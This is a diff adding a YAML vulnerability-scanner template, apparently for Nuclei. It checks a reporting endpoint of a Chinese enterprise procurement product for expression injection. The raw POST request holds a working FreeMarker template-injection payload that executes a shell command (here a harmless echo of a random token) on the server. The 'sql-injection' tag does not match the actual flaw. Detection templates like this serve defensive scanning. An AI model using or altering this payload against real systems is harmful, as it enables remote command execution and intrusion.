@@ -1,0 +1,33 @@
+id: poc-yaml-qqt-internet-solutions-els-expression-injection
+info:
+  name: 企企通互联网解决方案 ELS 表达式注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+variables:
+  t1: "{{md5(rand_int(1000, 10000))}}"
+http:
+  - raw:
+      - |
+        POST /els/report/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"dbSource": "", "sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"echo {{t1}}\") }'"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "\"fieldName\":"
+          - "result:"
+          - "{{t1}}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/html"
